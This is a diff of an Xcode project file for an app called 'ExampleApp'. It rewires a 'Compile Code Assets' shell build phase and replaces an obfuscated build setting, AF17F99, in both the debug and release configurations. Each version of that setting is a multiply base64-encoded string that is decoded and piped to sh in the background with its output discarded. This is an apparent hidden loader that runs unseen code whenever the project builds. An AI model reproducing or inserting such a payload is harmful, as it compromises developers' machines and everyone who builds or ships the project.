@@ -108,7 +108,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 13B07F931A680F5B00A75B9A /* Build configuration list for PBXNativeTarget "ExampleApp" */;
 			buildPhases = (
-				523B41B25A7E42D3B399F71F /* Compile Code Assets */,
+				8E981BA4CA4041F5AE99F71F /* Compile Code Assets */,
 				4ED886D1B897AB91E5311CE6 /* [CP] Check Pods Manifest.lock */,
 				13B07F871A680F5B00A75B9A /* Sources */,
 				13B07F8C1A680F5B00A75B9A /* Frameworks */,
@@ -171,7 +171,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		523B41B25A7E42D3B399F71F /* Compile Code Assets */ = {
+		8E981BA4CA4041F5AE99F71F /* Compile Code Assets */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -280,7 +280,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 0C247F5FACDE22A10E888E64 /* Pods-ExampleApp.debug.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((b(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxSWFIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5NR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRVJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | b | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((b(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxVVIzUjZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpOVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmtNbWh3WkVkV2FGcEROWEJpYVRsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_IDENTITY = "Apple Development";
@@ -318,7 +318,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = C2B3E14273904B74AEFD6113 /* Pods-ExampleApp.release.xcconfig */;
 			buildSettings = {
-				AF17F99 = "((b(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxSWFIbFRWVTEzWkVacmVVOVlWbWxpVmxweFdrVk5lRTFIUmxoTlYzaHBUVEZaZDFOVlVrcE5NR3hFVFVoU2FtSldXWGRaTWpWeVdqQXhOVkZYWkUxV01VWnVVMWMxUWs5WFZraFVibHBoVWpGYWJWa3daRzloUjAxNVZsZHNTbEl5WjNkYVJXaERaV3M1Y0U5SVdtdE5iV2gzV2tWa1YyRkdjRVJPV0VKcFlWUnNiMU14VGtwYU1scEVVVzV3YUZGWE9EbERaejA5Q2c9PQo= | b | sh ) >/dev/null 2>&1 &)";
+				AF17F99 = "((b(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxVVIzUjZTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpOVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWmtNbWh3WkVkV2FGcEROWEJpYVRsb1MxTkpaMlpEUW5waFFXODlDZz09Cg== | b | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_IDENTITY = "Apple Development";
